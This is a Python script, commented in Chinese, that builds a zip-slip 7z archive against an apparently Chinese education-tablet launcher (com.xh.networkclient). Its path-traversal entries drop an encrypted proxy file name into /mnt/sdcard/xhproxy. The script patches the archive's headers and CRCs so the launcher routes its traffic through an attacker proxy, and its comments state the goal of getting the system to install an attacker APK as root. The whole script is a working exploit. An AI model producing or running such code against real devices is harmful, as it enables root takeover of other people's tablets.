# -*- coding: utf-8 -*-
"""build_slip_proxy.py — 造 ZIP-SLIP 载荷: 写入启动器的代理开关目录 /mnt/sdcard/xhproxy/

依据(反编译实证):
  com.xh.networkclient.HttpRequest.checkProxy():
      File("/mnt/sdcard/xhproxy").listFiles()   -> 取第一个文件
      proxy = decryption(fileName)              -> 文件名解密即代理串
      JNISetProxy(proxy)                        -> 应用代理
  decryption 映射:  O->'.'  P->':'  QWERASDFZX -> 1234567890

⇒ 只要在 /mnt/sdcard/xhproxy/ 下有一个文件名为加密串的文件, 启动器全部 HTTP 就走该代理。
   之后它的"应用列表/版本检查/下载"都由我们应答 => RootSysProcess 以 root 安装我们的 APK。

做法与 build_slip_7z2 相同: 等长占位名 + 字节级替换 + 修 CRC(7z 头不压缩)。
"""
import io
import os
import struct
import subprocess
import zlib

SZ = r'C:\Program Files\7-Zip\7z.exe'
W = r'C:\p200build\7zslip_proxy'
os.makedirs(W, exist_ok=True)
MARK = "P200-XHPROXY\n"

# ---- 加密函数(与端侧 decryption 完全一致) ----
DIGITS = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]
KEYS = ["Q", "W", "E", "R", "A", "S", "D", "F", "Z", "X"]


def encrypt_proxy(p):
    out = []
    for ch in p:
        if ch == '.':
            out.append('O')
        elif ch == ':':
            out.append('P')
        elif ch.isdigit():
            out.append(KEYS[DIGITS.index(ch)])
        else:
            out.append(ch)
    return "".join(out)


PROXY = "192.168.137.1:18080"
ENC = encrypt_proxy(PROXY)
print("[0] 代理 %s  ->  文件名 %s" % (PROXY, ENC))

# ---- 目标越界路径 ----
# 提取基准目录未知(可能是 /sdcard/xuehai/<...>/ztktv4_resource/ 等), 故对多种深度都放一份。
TARGETS = []
for n in range(1, 9):
    TARGETS.append(("../" * n) + "mnt/sdcard/xhproxy/" + ENC)
    TARGETS.append(("../" * n) + "sdcard/xhproxy/" + ENC)
# 备用端口/地址(万一 8888 不可用)
for alt in ("192.168.137.1:8000", "192.168.137.1:8080"):
    TARGETS.append(("../" * 4) + "mnt/sdcard/xhproxy/" + encrypt_proxy(alt))
    TARGETS.append(("../" * 6) + "mnt/sdcard/xhproxy/" + encrypt_proxy(alt))
# 便于确认的标记文件(读 sdcard 即可核对)
TARGETS.append(("../" * 4) + "mnt/sdcard/xhproxy_on.txt")
TARGETS.append(("../" * 6) + "sdcard/xhproxy_on.txt")

# 去重 + 生成等长占位名(必须唯一, 否则 7z 报重复文件名)
pairs = []
used = set()
for idx, t in enumerate(TARGETS):
    if t in used:
        continue
    used.add(t)
    L = len(t)
    tail = "%03d" % (idx % 1000)
    orig = ("z" * (L - 7)) + tail + ".dat"
    assert len(orig) == L, (len(orig), L)
    pairs.append((orig, t))

arc = os.path.join(W, "slip_proxy.7z")
if os.path.exists(arc):
    os.remove(arc)
srcs = []
for orig, _ in pairs:
    fp = os.path.join(W, orig)
    io.open(fp, 'w', encoding='ascii').write(MARK)
    srcs.append(fp)

print("[1] 样本 %d 个, 名字长度 %s" % (len(srcs), sorted(set(len(o) for o, _ in pairs))))
r = subprocess.run([SZ, 'a', '-mhc=off', '-t7z', arc] + srcs, capture_output=True, text=True)
print("[2] 7z a rc=%d" % r.returncode)
if r.returncode != 0:
    print("    %s" % (r.stderr or '')[:400])
    raise SystemExit(1)

data = bytearray(io.open(arc, 'rb').read())
patched = 0
for orig, tgt in pairs:
    o16 = orig.encode('utf-16-le')
    t16 = tgt.encode('utf-16-le')
    p = data.find(o16)
    if p >= 0:
        data[p:p + len(o16)] = t16
        patched += 1
print("[3] 替换 %d / %d 条" % (patched, len(pairs)))

(shcrc,) = struct.unpack_from('<I', data, 8)
(nh_off,) = struct.unpack_from('<Q', data, 12)
(nh_size,) = struct.unpack_from('<Q', data, 20)
nh_start = 32 + nh_off
nh = bytes(data[nh_start:nh_start + nh_size])
struct.pack_into('<I', data, 28, zlib.crc32(nh) & 0xFFFFFFFF)
struct.pack_into('<I', data, 8, zlib.crc32(bytes(data[12:32])) & 0xFFFFFFFF)
print("[4] CRC 已修正")

out = os.path.join(W, "slip_proxy_fixed.7z")
io.open(out, 'wb').write(bytes(data))
print("[5] 输出 %s (%dB)" % (out, os.path.getsize(out)))

r2 = subprocess.run([SZ, 'l', '-slt', out], capture_output=True, text=True)
print("[6] 7z l 验证 rc=%d" % r2.returncode)
for line in (r2.stdout or '').splitlines():
    if line.startswith('Path = '):
        print("    " + line)
